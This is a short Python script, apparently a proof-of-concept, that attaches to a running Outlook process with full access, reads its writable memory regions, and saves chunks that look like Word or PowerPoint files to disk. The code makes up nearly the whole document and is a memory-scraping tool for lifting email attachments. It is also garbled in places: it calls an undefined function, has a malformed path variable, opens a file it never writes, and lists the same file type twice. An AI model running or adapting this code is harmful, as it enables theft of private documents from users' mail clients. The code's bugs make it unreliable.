import os
import psutil
import win32api
import win32com.client
import win32process
import win32com
import win32con
from magic import Magic

# objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.

#this purports to extract such files from the byte array in volatile memory and save them to disk just to show how this could be done

## the 
outlook = win32com.client.Dispatch("Outlook.Application")


def check_for_outlook():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.name().lower() == 'outlook.exe':
                pid = proc.pid
                read_process(pid)
                print("OK")
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            print("OK")
            pass

def read_process(pid):
    handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    base_address = 0
    length = 0
    while True:
        try:
            mbi = win32process.VirtualQueryEx(handle, base_address)
            base_address += mbi.RegionSize
            if (mbi.State == win32con.MEM_COMMIT) and (mbi.Protect == win32con.PAGE_READWRITE):
                data = win32process.ReadProcessMemory(handle, mbi.BaseAddress, mbi.RegionSize)
                try:
                    with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{pid}.bin"), "wb") as ext_file:
                        magic_number = Magic()
                        extension = magic_file(magic_number, data[:1024])
                       
                        office_exts = ['Microsoft Word 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1', 'Microsoft PowerPoint 2007+', 'PowerPoint 97-2003', 'Microsoft Office 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.0', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1']
                        if extension in office_exts:
                            file_extension = os.path.splitext(extension)[1]
                            output_file_name = f"{pid}{file_extension}"
                            with open(output_file_name, "wb") as export_file:
                                export_file.write(data)
                            print(f"Extraction successful: {output_file_name}")
                except Exception as e:
                    print("Couldn't read byte-array:", e)
        except:
            break

check_for_outlook()
 